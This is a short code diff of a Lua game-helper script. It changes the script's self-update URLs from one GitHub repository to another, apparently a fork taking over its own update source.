@@ -106,9 +106,9 @@ local update_state = {
 }
 local script_version = 13
 local script_version_text = "3.2 Update"
-local update_url = "https://raw.githubusercontent.com/YamadaEnotic/AH-Script/master/update.ini"
+local update_url = "https://raw.githubusercontent.com/Daria2006/skript/main/update.ini"
 local update_path = getWorkingDirectory() .. '/update.ini'
-local script_url = "https://raw.githubusercontent.com/YamadaEnotic/AH-Script/master/AH_Bred.lua"
+local script_url = "https://raw.githubusercontent.com/Daria2006/skript/main/AH_Bred.lua"
 local script_path = thisScript().path
 local scoreboard_url = "https://raw.githubusercontent.com/YamadaEnotic/AH-Script/master/scoreboard.lua"
 local scoreboard_path = getWorkingDirectory() .. "\\lib\\scoreboard.lua"
